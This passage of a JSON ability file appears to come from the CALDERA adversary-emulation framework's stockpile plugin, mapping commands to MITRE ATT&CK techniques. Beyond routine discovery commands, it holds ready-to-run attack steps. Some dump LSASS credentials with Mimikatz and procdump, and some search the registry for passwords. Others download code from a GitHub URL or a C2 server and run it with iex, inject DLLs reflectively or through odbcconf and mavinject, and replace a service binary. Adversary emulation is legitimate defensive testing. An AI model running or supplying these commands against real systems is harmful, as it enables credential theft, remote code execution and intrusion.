    "T1087.001__discovery__Account Discovery: Local Account__feaced8f-f43f-452a-9500-a5219488abb8": {
        "description": "Identify all local users",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1087.001",
            "name": "Account Discovery: Local Account"
        },
        "platforms": {
            "darwin": {
                "sh": {
                    "command": "dscl . list /Users | grep -v '_'\n"
                }
            },
            "windows": {
                "psh": {
                    "command": "Get-WmiObject -Class Win32_UserAccount\n"
                }
            }
        },
        "id__dependence__fact": [
            "feaced8f-f43f-452a-9500-a5219488abb8",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "feaced8f-f43f-452a-9500-a5219488abb8"
    },
    "T1018__discovery__Remote System Discovery__ce485320-41a4-42e8-a510-f5a8fe96a644": {
        "description": "Identify the organizations mail server",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1018",
            "name": "Remote System Discovery"
        },
        "platforms": {
            "linux": {
                "sh": {
                    "command": "host \"#{target.org.domain}\" | grep mail | grep -oE '[^ ]+$' | rev | cut -c 2- | rev",
                    "parsers": {
                        "plugins.stockpile.app.parsers.basic": [
                            {
                                "source": "target.org.emailhost"
                            }
                        ]
                    }
                }
            },
            "darwin": {
                "sh": {
                    "command": "host \"#{target.org.domain}\" | grep mail | grep -oE '[^ ]+$' | rev | cut -c 2- | rev",
                    "parsers": {
                        "plugins.stockpile.app.parsers.basic": [
                            {
                                "source": "target.org.emailhost"
                            }
                        ]
                    }
                }
            },
            "windows": {
                "psh": {
                    "command": "(nslookup -querytype=mx #{target.org.domain}. | Select-String -pattern 'mail' | Out-String).Trim()\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.basic": [
                            {
                                "source": "target.org.emailhost"
                            }
                        ]
                    }
                }
            }
        },
        "id__dependence__fact": [
            "ce485320-41a4-42e8-a510-f5a8fe96a644",
            "None",
            "target.org.emailhost",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "ce485320-41a4-42e8-a510-f5a8fe96a644"
    },
    "T1087.002__discovery__Account Discovery: Domain Account__364ea817-bbb9-4083-87dd-94b9dba45f6f": {
        "description": "The net utility is executed via cmd to enumerate detailed information about a specific user account.",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1087.002",
            "name": "Account Discovery: Domain Account"
        },
        "platforms": {
            "windows": {
                "cmd,psh": {
                    "command": "net user #{domain.user.name} /domain"
                }
            }
        },
        "id__dependence__fact": [
            "364ea817-bbb9-4083-87dd-94b9dba45f6f",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "364ea817-bbb9-4083-87dd-94b9dba45f6f"
    },
    "T1135__discovery__Network Share Discovery__530e47c6-8592-42bf-91df-c59ffbd8541b": {
        "description": "Network Share Discovery",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1135",
            "name": "Network Share Discovery"
        },
        "platforms": {
            "windows": {
                "pwsh,psh": {
                    "command": "Get-SmbShare | ConvertTo-Json",
                    "parsers": {
                        "plugins.stockpile.app.parsers.json": [
                            {
                                "source": "domain.smb.share",
                                "custom_parser_vals": {
                                    "json_key": "Path",
                                    "json_type": "str"
                                }
                            }
                        ]
                    }
                }
            }
        },
        "id__dependence__fact": [
            "530e47c6-8592-42bf-91df-c59ffbd8541b",
            "None",
            "domain.smb.share",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "530e47c6-8592-42bf-91df-c59ffbd8541b"
    },
    "T1057__discovery__Process Discovery__05cda6f6-2b1b-462e-bff1-845af94343f7": {
        "description": "Discovers processes that the current user has the ability to access and selects an injectable one",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1057",
            "name": "Process Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "$owners = @{};\ngwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};\n$ps = get-process | select processname,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}};\n$valid = foreach($p in $ps) { if($p.Owner -eq $env:USERNAME -And $p.ProcessName -eq \"svchost\") {$p} };\n$valid | ConvertTo-Json\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.json": [
                            {
                                "source": "host.process.id",
                                "custom_parser_vals": {
                                    "json_key": "Id",
                                    "json_type": "int"
                                }
                            }
                        ]
                    }
                }
            }
        },
        "id__dependence__fact": [
            "05cda6f6-2b1b-462e-bff1-845af94343f7",
            "None",
            "host.process.id",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "05cda6f6-2b1b-462e-bff1-845af94343f7"
    },
    "T1010__discovery__Application Window Discovery__5c65eec8-4839-4713-a4e1-86b2e75d1927": {
        "description": "Extracts the names of all open non-explorer windows, and the locations of all explorer windows.",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1010",
            "name": "Application Window Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "$x = Get-Process | Where-Object {$_.MainWindowTitle -ne \"\"} | Select-Object MainWindowTitle;\n$a = New-Object -com \"Shell.Application\"; $b = $a.windows() | select-object LocationName;\nwrite-host ($x | Format-List | Out-String) ($b | Format-List | Out-String)"
                }
            }
        },
        "id__dependence__fact": [
            "5c65eec8-4839-4713-a4e1-86b2e75d1927",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "5c65eec8-4839-4713-a4e1-86b2e75d1927"
    },
    "T1083__discovery__File and Directory Discovery__1c353eb4-29ab-4dfe-88ed-f34f5a60848e": {
        "description": "Find or discover files on the file system",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1083",
            "name": "File and Directory Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "Get-ChildItem -Path #{host.system.path}\n"
                }
            }
        },
        "id__dependence__fact": [
            "1c353eb4-29ab-4dfe-88ed-f34f5a60848e",
            "host.system.path",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "1c353eb4-29ab-4dfe-88ed-f34f5a60848e"
    },
    "T1518.001__discovery__Software Discovery: Security Software Discovery__2dece965-37a0-4f70-a391-0f30e3331aba": {
        "description": "Identify AV",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1518.001",
            "name": "Software Discovery: Security Software Discovery"
        },
        "platforms": {
            "darwin": {
                "sh": {
                    "command": "find /Applications/ -maxdepth 2 -iname *.app | grep -io \"[a-z ]*\\.app\" | grep -Ei -- \"symantec|norton|bitdefender|kapersky|eset|avast|avira|malwarebytes|sophos|(trend micro)\"\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.antivirus": [
                            {
                                "source": "host.installed.av"
                            }
                        ]
                    }
                }
            },
            "windows": {
                "psh": {
                    "command": "wmic /NAMESPACE:\\\\root\\SecurityCenter2 PATH AntiVirusProduct GET /value\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.basic": [
                            {
                                "source": "host.installed.av"
                            }
                        ]
                    }
                }
            }
        },
        "id__dependence__fact": [
            "2dece965-37a0-4f70-a391-0f30e3331aba",
            "None",
            "host.installed.av",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "2dece965-37a0-4f70-a391-0f30e3331aba"
    },
    "T1083__discovery__File and Directory Discovery__6e1a53c0-7352-4899-be35-fa7f364d5722": {
        "description": "Print the current working directory on the system",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1083",
            "name": "File and Directory Discovery"
        },
        "platforms": {
            "darwin": {
                "sh": {
                    "command": "pwd\n"
                }
            },
            "linux": {
                "sh": {
                    "command": "pwd\n"
                }
            },
            "windows": {
                "psh": {
                    "command": "pwd\n"
                }
            }
        },
        "id__dependence__fact": [
            "6e1a53c0-7352-4899-be35-fa7f364d5722",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "6e1a53c0-7352-4899-be35-fa7f364d5722"
    },
    "T1016__discovery__System Network Configuration Discovery__14a21534-350f-4d83-9dd7-3c56b93a0c17": {
        "description": "Find Domain information",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1016",
            "name": "System Network Configuration Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "nbtstat -n\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.nbtstat": [
                            {
                                "source": "network.domain.name"
                            }
                        ]
                    }
                }
            }
        },
        "id__dependence__fact": [
            "14a21534-350f-4d83-9dd7-3c56b93a0c17",
            "None",
            "network.domain.name",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "14a21534-350f-4d83-9dd7-3c56b93a0c17"
    },
    "T1018__discovery__Remote System Discovery__fdf8bf36-797f-4157-805b-fe7c1c6fc903": {
        "description": "Find hostname of remote host",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1018",
            "name": "Remote System Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "nbtstat -A #{remote.host.ip}"
                }
            }
        },
        "id__dependence__fact": [
            "fdf8bf36-797f-4157-805b-fe7c1c6fc903",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "fdf8bf36-797f-4157-805b-fe7c1c6fc903"
    },
    "T1201__discovery__Password Policy Discovery__e82f39e2-56f8-4f19-8376-b007f9ac5f8a": {
        "description": "Password Policy Discovery",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1201",
            "name": "Password Policy Discovery"
        },
        "platforms": {
            "darwin": {
                "sh": {
                    "command": "pwpolicy getaccountpolicies\n"
                }
            },
            "linux": {
                "sh": {
                    "command": "cat /etc/pam.d/common-password\n"
                }
            },
            "windows": {
                "psh": {
                    "command": "net accounts"
                }
            }
        },
        "id__dependence__fact": [
            "e82f39e2-56f8-4f19-8376-b007f9ac5f8a",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "e82f39e2-56f8-4f19-8376-b007f9ac5f8a"
    },
    "T1069.002__discovery__Permission Groups Discovery: Domain Groups__2afae782-6d0a-4fbd-a6b6-d1ce90090eac": {
        "description": "Use PowerView to query the Active Directory server to determine remote admins",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1069.002",
            "name": "Permission Groups Discovery: Domain Groups"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "Import-Module .\\powerview.ps1;\n$backup = \"#{backup.admin.ability}\";\n$userName = \"#{domain.user.name}\";\n$userPassword = \"#{domain.user.password}\";\n$secStringPassword = ConvertTo-SecureString $userPassword -AsPlainText -Force;\n$credObject = New-Object System.Management.Automation.PSCredential ($userName, $secStringPassword);\nGet-NetLocalGroupMember -ComputerName #{remote.host.fqdn} -Credential $credObject\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.netlocalgroup": [
                            {
                                "source": "remote.host.fqdn",
                                "edge": "has_admin",
                                "target": "domain.user.name"
                            }
                        ]
                    },
                    "payloads": [
                        "powerview.ps1"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "2afae782-6d0a-4fbd-a6b6-d1ce90090eac",
            "remote.host.fqdn",
            "remote.host.fqdn",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "2afae782-6d0a-4fbd-a6b6-d1ce90090eac"
    },
    "T1016__discovery__System Network Configuration Discovery__9a30740d-3aa8-4c23-8efa-d51215e8a5b9": {
        "description": "View all potential WIFI networks on host",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1016",
            "name": "System Network Configuration Discovery"
        },
        "platforms": {
            "darwin": {
                "sh": {
                    "command": "./#{payload:9f639067-370a-40ba-b7ac-6f1c15d5a158} scan\n",
                    "payloads": [
                        "9f639067-370a-40ba-b7ac-6f1c15d5a158"
                    ]
                }
            },
            "linux": {
                "sh": {
                    "command": "./#{payload:9f639067-370a-40ba-b7ac-6f1c15d5a158} scan\n",
                    "payloads": [
                        "9f639067-370a-40ba-b7ac-6f1c15d5a158"
                    ]
                }
            },
            "windows": {
                "psh": {
                    "command": ".\\#{payload:28f9bf43-4f14-4965-9bd9-b70fd6993d8e} -Scan\n",
                    "payloads": [
                        "28f9bf43-4f14-4965-9bd9-b70fd6993d8e"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "9a30740d-3aa8-4c23-8efa-d51215e8a5b9",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "9a30740d-3aa8-4c23-8efa-d51215e8a5b9"
    },
    "T1482__discovery__Domain Trust Discovery__6131397e-7765-424e-a594-3d7fb2d93a6a": {
        "description": "Determine the Windows Domain of a computer",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1482",
            "name": "Domain Trust Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "Import-Module .\\powerview.ps1 -Force;\nGet-NetDomain | ConvertTo-Json -Depth 1\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.json": [
                            {
                                "source": "domain.ad.forest",
                                "custom_parser_vals": {
                                    "json_key": "Forest",
                                    "json_type": "str"
                                }
                            },
                            {
                                "source": "domain.ad.name",
                                "custom_parser_vals": {
                                    "json_key": "Name",
                                    "json_type": "str"
                                }
                            }
                        ]
                    },
                    "payloads": [
                        "powerview.ps1"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "6131397e-7765-424e-a594-3d7fb2d93a6a",
            "None",
            "domain.ad.forest",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "6131397e-7765-424e-a594-3d7fb2d93a6a"
    },
    "T1083__discovery__File and Directory Discovery__52177cc1-b9ab-4411-ac21-2eadc4b5d3b8": {
        "description": "List contents of current directory",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1083",
            "name": "File and Directory Discovery"
        },
        "platforms": {
            "darwin": {
                "sh": {
                    "command": "ls\n"
                }
            },
            "linux": {
                "sh": {
                    "command": "ls\n"
                }
            },
            "windows": {
                "psh": {
                    "command": "dir\n"
                }
            }
        },
        "id__dependence__fact": [
            "52177cc1-b9ab-4411-ac21-2eadc4b5d3b8",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "52177cc1-b9ab-4411-ac21-2eadc4b5d3b8"
    },
    "T1016__discovery__System Network Configuration Discovery__921055f4-5970-4707-909e-62f594234d91": {
        "description": "Ping a remote host to see if it is accessible",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1016",
            "name": "System Network Configuration Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "ping #{remote.host.fqdn}\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.firewallping": [
                            {
                                "source": "remote.host.fqdn",
                                "edge": "isAccessibleFrom"
                            }
                        ]
                    }
                }
            }
        },
        "id__dependence__fact": [
            "921055f4-5970-4707-909e-62f594234d91",
            "remote.host.fqdn",
            "remote.host.fqdn",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "921055f4-5970-4707-909e-62f594234d91"
    },
    "T1007__discovery__System Service Discovery__c6607391-d02c-44b5-9b13-d3492ca58599": {
        "description": "Identify system services",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1007",
            "name": "System Service Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "Get-Service"
                }
            }
        },
        "id__dependence__fact": [
            "c6607391-d02c-44b5-9b13-d3492ca58599",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "c6607391-d02c-44b5-9b13-d3492ca58599"
    },
    "T1046__discovery__Network Service Scanning__5a4cb2be-2684-4801-9355-3a90c91e0004": {
        "description": "Scans the local network for common open ports",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1046",
            "name": "Network Service Scanning"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "Import-Module ./basic_scanner.ps1;\n$ports = @(22, 53, 80, 445);\nGet-NetIPConfiguration | ?{$_.NetAdapter.Status -ne \"Disconnected\"} | Get-NetIPaddress -AddressFamily IPv4 | %{\n    $ipv4 = $_.IPAddress;\n    $prefixLength = $_.PrefixLength;\n    Scan-Netrange -ipv4 $ipv4 -prefixLength $prefixLength -ports $ports;\n};\n",
                    "payloads": [
                        "basic_scanner.ps1"
                    ],
                    "timeout": 180
                }
            }
        },
        "id__dependence__fact": [
            "5a4cb2be-2684-4801-9355-3a90c91e0004",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "5a4cb2be-2684-4801-9355-3a90c91e0004"
    },
    "T1543.003__persistence__Create or Modify System Process: Windows Service__52771610-2322-44cf-816b-a7df42b4c086": {
        "description": "This is an example technique. snmptrap.exe should be changed in the command\nbelow with the new desired service binary. Depending on the value of\nhost.service.modifiable this ability can damage the target system.\n",
        "tactic": "persistence",
        "technique": {
            "attack_id": "T1543.003",
            "name": "Create or Modify System Process: Windows Service"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "$s = Get-Service -Name #{host.service.modifiable};\nif ($s.status -ne 'Stopped') { Stop-Service $s };\n$exe = (Get-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Services\\#{host.service.modifiable}\").ImagePath.split()[0];\n$path = (Resolve-Path $exe).Path;\nCopy-Item -Path $path -Destination ($path + \".saved\");\nCopy-Item -Path \"C:\\Windows\\System32\\snmptrap.exe\" -Destination $path\n",
                    "cleanup": "$exe = (Get-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Services\\#{host.service.modifiable}\").ImagePath.split()[0];\n$path = (Resolve-Path $exe).Path;\nIf (Test-Path ($path + \".saved\")) {\n  Remove-Item $path;\n  Move-Item -Path ($path + \".saved\") -Destination $path\n}\n"
                }
            }
        },
        "id__dependence__fact": [
            "52771610-2322-44cf-816b-a7df42b4c086",
            "host.service.modifiable",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "52771610-2322-44cf-816b-a7df42b4c086"
    },
    "T1003.001__credential-access__OS Credential Dumping: LSASS Memory__baac2c6d-4652-4b7e-ab0a-f1bf246edd12": {
        "description": "Use powerkatz to execute mimikatz and attempt to grab plaintext and/or hashed passwords",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1003.001",
            "name": "OS Credential Dumping: LSASS Memory"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };\n$web = (New-Object System.Net.WebClient);\n$result = $web.DownloadString(\"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/4c7a2016fc7931cd37273c5d8e17b16d959867b3/Exfiltration/Invoke-Mimikatz.ps1\");\niex $result; Invoke-Mimikatz -DumpCreds\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.katz": [
                            {
                                "source": "domain.user.name",
                                "edge": "has_password",
                                "target": "domain.user.password"
                            }
                        ]
                    }
                }
            }
        },
        "id__dependence__fact": [
            "baac2c6d-4652-4b7e-ab0a-f1bf246edd12",
            "None",
            "domain.user.name",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "baac2c6d-4652-4b7e-ab0a-f1bf246edd12"
    },
    "T1552.002__credential-access__Unsecured Credentials: Credentials in Registry__98e58fc4-3843-4511-89b1-50cb872e0c9b": {
        "description": "Search for possible credentials stored in the HKLM Hive",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1552.002",
            "name": "Unsecured Credentials: Credentials in Registry"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "reg query HKLM /f password /t REG_SZ /s\n"
                }
            }
        },
        "id__dependence__fact": [
            "98e58fc4-3843-4511-89b1-50cb872e0c9b",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "98e58fc4-3843-4511-89b1-50cb872e0c9b"
    },
    "T1040__credential-access__Network Sniffing__1b4fb81c-8090-426c-93ab-0a633e7a16a7": {
        "description": "Perform a packet capture",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1040",
            "name": "Network Sniffing"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "timeout": 80,
                    "command": "$path = \"$ENV:UserProfile\\Desktop\\pcap.etl\";\nNew-NetEventSession -Name \"PCAP\" -CaptureMode SaveToFile -LocalFilePath $path;\nAdd-NetEventProvider -Name \"Microsoft-Windows-TCPIP\" -SessionName \"PCAP\";\nStart-NetEventSession -Name \"PCAP\";\nStart-Sleep -s 60;\nStop-NetEventSession -Name \"PCAP\";\nif (Test-Path $path) {\n  echo $path;\n  exit 0;\n} else {\n  echo \"Failed to generate PCAP file.\";\n  exit 1;\n};\n",
                    "cleanup": "Remove-NetEventSession -Name \"PCAP\";\nRemove-Item $ENV:UserProfile\\Desktop\\pcap.etl;\n"
                }
            },
            "darwin": {
                "sh": {
                    "command": "tcpdump -i en0 & sleep 5; kill $!\n"
                }
            }
        },
        "id__dependence__fact": [
            "1b4fb81c-8090-426c-93ab-0a633e7a16a7",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "1b4fb81c-8090-426c-93ab-0a633e7a16a7"
    },
    "T1003.001__credential-access__OS Credential Dumping: LSASS Memory__0ef4cc7b-611c-4237-b20b-db36b6906554": {
        "description": "Dump lsass for later use with mimikatz",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1003.001",
            "name": "OS Credential Dumping: LSASS Memory"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "$ps_url = \"https://download.sysinternals.com/files/Procdump.zip\";\n$download_folder = \"C:\\Users\\Public\\\";\n$staging_folder = \"C:\\Users\\Public\\temp\";\nStart-BitsTransfer -Source $ps_url -Destination $download_folder;\nExpand-Archive -LiteralPath $download_folder\"Procdump.zip\" -DestinationPath $staging_folder;\n$arch=[System.Environment]::Is64BitOperatingSystem;\n\nif ($arch) {\n    iex $staging_folder\"\\procdump64.exe -accepteula -ma lsass.exe\" > $env:APPDATA\\error.dmp 2>&1;\n} else {\n    iex $staging_folder\"\\procdump.exe -accepteula -ma lsass.exe\" > $env:APPDATA\\error.dmp 2>&1;\n}\nremove-item $staging_folder -Recurse;\n"
                }
            }
        },
        "id__dependence__fact": [
            "0ef4cc7b-611c-4237-b20b-db36b6906554",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "0ef4cc7b-611c-4237-b20b-db36b6906554"
    },
    "T1552.002__credential-access__Unsecured Credentials: Credentials in Registry__3aad5312-d48b-4206-9de4-39866c12e60f": {
        "description": "Search for possible credentials stored in Registry",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1552.002",
            "name": "Unsecured Credentials: Credentials in Registry"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "reg query HKCU /f password /t REG_SZ /s\n"
                }
            }
        },
        "id__dependence__fact": [
            "3aad5312-d48b-4206-9de4-39866c12e60f",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "3aad5312-d48b-4206-9de4-39866c12e60f"
    },
    "T1003.001__credential-access__OS Credential Dumping: LSASS Memory__7049e3ec-b822-4fdf-a4ac-18190f9b66d1": {
        "description": "Use Invoke-Mimikatz",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1003.001",
            "name": "OS Credential Dumping: LSASS Memory"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "Import-Module .\\invoke-mimi.ps1;\nInvoke-Mimikatz -DumpCreds\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.katz": [
                            {
                                "source": "domain.user.name",
                                "edge": "has_password",
                                "target": "domain.user.password"
                            },
                            {
                                "source": "domain.user.name",
                                "edge": "has_hash",
                                "target": "domain.user.ntlm"
                            },
                            {
                                "source": "domain.user.name",
                                "edge": "has_hash",
                                "target": "domain.user.sha1"
                            }
                        ]
                    },
                    "payloads": [
                        "invoke-mimi.ps1"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "7049e3ec-b822-4fdf-a4ac-18190f9b66d1",
            "None",
            "domain.user.name",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "7049e3ec-b822-4fdf-a4ac-18190f9b66d1"
    },
    "T1055.002__credential-access__Process Injection: Portable Executable Injection__c9f2c7ae-0092-4ea0-b9ae-92014eba7ce7": {
        "description": "Injects cred dumper exe into an available process",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1055.002",
            "name": "Process Injection: Portable Executable Injection"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "$url=\"#{server}/file/download\";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add(\"file\",\"debugger.dll\");\n$PBytes = $wc.DownloadData($url);\n$wc1 = New-Object System.net.webclient;\n$wc1.headers.add(\"file\",\"Invoke-ReflectivePEInjection.ps1\");\nIEX ($wc1.DownloadString($url));\nInvoke-ReflectivePEInjection -PBytes $PBytes -verbose"
                }
            }
        },
        "id__dependence__fact": [
            "c9f2c7ae-0092-4ea0-b9ae-92014eba7ce7",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "c9f2c7ae-0092-4ea0-b9ae-92014eba7ce7"
    },
    "T1003__credential-access__OS Credential Dumping__3c647015-ab0a-496a-8847-6ab173cd2b22": {
        "description": "Custom GO credential dumper using minidumpwritedump",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1003",
            "name": "OS Credential Dumping"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": ".\\totallylegit.exe #{host.process.id} C:\\Users\\Public\\creds.dmp\n",
                    "payloads": [
                        "totallylegit.exe"
                    ],
                    "cleanup": "if (Test-Path \"C:\\Users\\Public\\creds.dmp\") {\n  rm \"C:\\Users\\Public\\creds.dmp\" -Force;\n};\n"
                }
            }
        },
        "id__dependence__fact": [
            "3c647015-ab0a-496a-8847-6ab173cd2b22",
            "host.process.id",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "3c647015-ab0a-496a-8847-6ab173cd2b22"
    },
    "T1055.001__defense-evasion__Process Injection: Dynamic-link Library Injection__a74bc239-a196-4f7e-8d5c-fe8c0266071c": {
        "description": "Leverage odbcconf for DLL injection",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1055.001",
            "name": "Process Injection: Dynamic-link Library Injection"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "odbcconf.exe /S /A {REGSVR \"C:\\Users\\Public\\sandcat.dll\"}\n"
                }
            }
        },
        "id__dependence__fact": [
            "a74bc239-a196-4f7e-8d5c-fe8c0266071c",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "a74bc239-a196-4f7e-8d5c-fe8c0266071c"
    },
    "T1055.002__defense-evasion__Process Injection: Portable Executable Injection__e5bcefee-262d-4568-a261-e8a20855ec81": {
        "description": "Leverage Mavinject (signed binary) for DLL injection",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1055.002",
            "name": "Process Injection: Portable Executable Injection"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "$explorer = Get-Process -Name explorer;\nmavinject.exe $explorer.id C:\\Users\\Public\\sandcat.dll\n"
                }
            }
        },
        "id__dependence__fact": [
            "e5bcefee-262d-4568-a261-e8a20855ec81",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "e5bcefee-262d-4568-a261-e8a20855ec81"
    },
    "T1059.001__defense-evasion__PowerShell__e5f9de8f-3df1-4e78-ad92-a784e3f6770d": {
        "description": "Copy powershell to non-standard location and perform triage commands",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1059.001",
            "name": "PowerShell"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "Copy-Item C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe C:\\Windows\\Temp\\debug.exe;\nC:\\Windows\\Temp\\debug.exe get-process >> C:\\Windows\\temp\\debug.log;\nC:\\Windows\\Temp\\debug.exe get-localgroup >> C:\\Windows\\temp\\debug.log;\nC:\\Windows\\Temp\\debug.exe get-localuser >> C:\\Windows\\temp\\debug.log;\nC:\\Windows\\Temp\\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion >> C:\\Windows\\temp\\debug.log;\n"
                }
            }
        },
        "id__dependence__fact": [
            "e5f9de8f-3df1-4e78-ad92-a784e3f6770d",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "e5f9de8f-3df1-4e78-ad92-a784e3f6770d"
    },
    "T1055.002__defense-evasion__Process Injection: Portable Executable Injection__a398986f-31b0-436a-87e9-c8e82c028f3c": {
        "description": "Injects sandcat DLL into an available process",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1055.002",
            "name": "Process Injection: Portable Executable Injection"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "$url=\"#{server}/file/download\";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add(\"platform\",\"windows\");\n$wc.Headers.add(\"file\",\"shared.go\");\n$wc.Headers.add(\"server\",\"#{server}\");\n$PEBytes = $wc.DownloadData($url);\n$wc1 = New-Object System.net.webclient;\n$wc1.headers.add(\"file\",\"Invoke-ReflectivePEInjection.ps1\");\nIEX ($wc1.DownloadString($url));\nInvoke-ReflectivePEInjection -verbose -PBytes $PEbytes -ProcId #{host.process.id}\n"
                }
            }
        },
        "id__dependence__fact": [
            "a398986f-31b0-436a-87e9-c8e82c028f3c",
            "host.process.id",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "a398986f-31b0-436a-87e9-c8e82c028f3c"
    },
    "T1070.004__defense-evasion__Indicator Removal on Host: File Deletion__4cd4eb44-29a7-4259-91ae-e457b283a880": {
